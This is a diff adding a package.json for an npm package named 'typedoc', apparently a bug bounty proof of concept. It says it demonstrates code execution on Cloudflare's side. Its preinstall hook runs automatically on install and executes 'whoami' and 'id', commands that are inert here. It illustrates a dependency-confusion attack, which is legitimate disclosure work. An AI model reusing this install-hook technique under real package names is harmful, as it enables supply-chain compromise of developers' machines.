@@ -1,0 +1,9 @@
+{
+  "name": "typedoc",
+  "version": "1.0.0",
+  "description": "Inert bug bounty proof of concept for Cloudflare. Demonstrating safe RCE.",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "echo '=== BUG BOUNTY POC: ACE ACHIEVED ===' && whoami && id"
+  }
+}
